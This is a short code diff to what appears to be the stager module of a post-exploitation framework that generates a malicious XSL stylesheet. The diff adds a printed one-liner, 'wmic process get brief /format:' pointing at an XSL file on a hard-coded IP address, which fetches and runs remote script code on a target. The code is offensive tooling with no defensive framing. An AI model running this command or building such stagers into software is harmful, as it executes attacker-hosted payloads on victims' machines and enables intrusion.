@@ -1,4 +1,5 @@
 from lib.common import helpers
+from termcolor import colored
 
 class Stager:
 
@@ -732,7 +733,8 @@ class Stager:
                 ]]></ms:script>
                 </stylesheet>
                 """
-
+                command = """\n[+] wmic process get brief /format:"http://10.10.14.172/launcher.xsl" """                       
+                print colored(command, 'green', attrs=['bold'])      
                 
                                 
                 return code
